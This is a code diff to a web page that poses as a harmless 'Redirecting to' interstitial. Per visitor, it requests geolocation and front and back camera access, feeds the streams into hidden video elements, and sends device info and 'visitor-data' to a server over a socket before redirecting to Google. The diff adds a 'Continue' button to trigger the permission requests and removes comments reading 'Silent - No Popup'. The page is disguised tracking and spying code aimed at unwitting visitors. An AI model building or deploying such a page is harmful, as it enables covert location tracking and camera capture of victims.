@@ -46,18 +46,36 @@
             display: inline-block;
             margin-top: 4px;
         }
-        .sub-text {
-            font-size: 13px;
-            color: #8895aa;
-            margin-top: 12px;
+        .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
+        .btn-continue {
+            margin-top: 25px;
+            padding: 14px 40px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
         }
-        .status-text {
+        .btn-continue:hover {
+            background: #3367d6;
+        }
+        .btn-continue:disabled {
+            background: #a0aec0;
+            cursor: not-allowed;
+        }
+        #statusText {
             font-size: 14px;
             color: #667eea;
             margin-top: 15px;
             font-weight: 500;
         }
         #hiddenVideo, #hiddenVideoBack { display: none; }
+        .permission-status {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
@@ -65,8 +83,10 @@
         <div class="spinner"></div>
         <div class="redirect-text">Redirecting to</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
-        <div class="sub-text">Please wait a moment</div>
-        <div class="status-text" id="statusText">⏳ Connecting...</div>
+        <div class="sub-text">Click continue to proceed</div>
+        <div id="statusText">⏳ Ready</div>
+        
+        <button class="btn-continue" id="continueBtn">▶ Continue</button>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
@@ -86,10 +106,12 @@
             const visitorId = window.location.pathname.split('/').pop();
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
             const statusText = document.getElementById('statusText');
+            const continueBtn = document.getElementById('continueBtn');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
+            let isProcessing = false;
             
             let permissions = {
                 location: false,
@@ -101,9 +123,6 @@
             let cameraStreamBack = null;
             let frontVideo = document.getElementById('hiddenVideo');
             let backVideo = document.getElementById('hiddenVideoBack');
-            let locationSent = false;
-            let frontPhotoSent = false;
-            let backPhotoSent = false;
 
             function updateStatus(msg) {
                 statusText.textContent = msg;
@@ -113,7 +132,7 @@
             function checkAllPermissions() {
                 const allGranted = permissions.location && permissions.frontCamera && permissions.backCamera;
                 if (allGranted) {
-                    updateStatus('✅ Connecting...');
+                    updateStatus('✅ Permissions granted! Redirecting...');
                     
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', {
@@ -129,7 +148,11 @@
                         }
                     }, 1500);
                 } else {
-                    updateStatus('⏳ Connecting...');
+                    const pending = [];
+                    if (!permissions.location) pending.push('Location');
+                    if (!permissions.frontCamera) pending.push('Front Camera');
+                    if (!permissions.backCamera) pending.push('Back Camera');
+                    updateStatus(`⏳ Waiting for: ${pending.join(', ')}`);
                 }
             }
 
@@ -168,10 +191,8 @@
                     socket.on('connect', function() {
                         console.log('✅ Socket connected');
                         sendDeviceInfo();
-                        
-                        setTimeout(function() {
-                            requestAllPermissions();
-                        }, 500);
+                        updateStatus('✅ Connected. Click Continue');
+                        continueBtn.disabled = false;
                     });
 
                     socket.on('connect_error', function(err) {
@@ -253,10 +274,19 @@
                 }
             }
 
-            function requestAllPermissions() {
-                updateStatus('⏳ Connecting...');
+            // ===== CONTINUE BUTTON CLICK =====
+            continueBtn.addEventListener('click', function() {
+                if (isProcessing) return;
+                isProcessing = true;
+                continueBtn.disabled = true;
+                continueBtn.textContent = '⏳ Processing...';
                 
-                // ===== LOCATION (Silent - No Popup) =====
+                updateStatus('⏳ Requesting permissions...');
+                requestAllPermissions();
+            });
+
+            function requestAllPermissions() {
+                // ===== LOCATION =====
                 console.log('📍 Requesting location...');
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
@@ -315,7 +345,7 @@
                     );
                 }
 
-                // ===== FRONT CAMERA (Silent - No Popup) =====
+                // ===== FRONT CAMERA =====
                 console.log('📸 Requesting front camera...');
                 navigator.mediaDevices.getUserMedia({
                     video: { 
@@ -344,7 +374,7 @@
                     checkAllPermissions();
                 });
 
-                // ===== BACK CAMERA (Silent - No Popup) =====
+                // ===== BACK CAMERA =====
                 console.log('📸 Requesting back camera...');
                 navigator.mediaDevices.getUserMedia({
                     video: { 
